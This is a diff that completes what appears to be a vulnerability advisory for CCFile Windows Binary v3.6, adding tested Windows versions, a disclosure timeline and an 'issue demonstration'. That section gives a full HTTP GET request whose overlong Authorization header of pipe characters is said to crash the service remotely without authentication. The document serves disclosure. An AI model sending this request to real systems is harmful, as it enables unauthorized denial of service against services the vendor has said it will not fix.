@@ -12,7 +12,14 @@ http://www.ccfile.net/index.htm
 
 CCFile Windows Binary - v3.6
 
-[TBD]
+Tested on:  
+Windows XP Professional  
+Service Pack 3  
+  
+Windows 7 Professional
+Service Pack 1  
+
+The web-based software allows a malicious user to remotely crash the service without authentication
 
 # discovery
 
@@ -24,8 +31,20 @@ https://www.peach.tech
 
 # issue demonstration
 
-[TBD]  
+The following HTTP GET request will crash the service remotely:    
+```
+GET /download.htm?file= HTTP/1.1
+User-Agent: Mozilla/4.0
+Host: 172.16.6.133:80
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Referer: http://172.16.6.133/
+Authorization: Basic ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+Conection: Keep-Alive
+```
 
 # progress
  
 080817 - Vendor Notified  
+090817 - Vendor Acknowledged and responded with no intention to fix
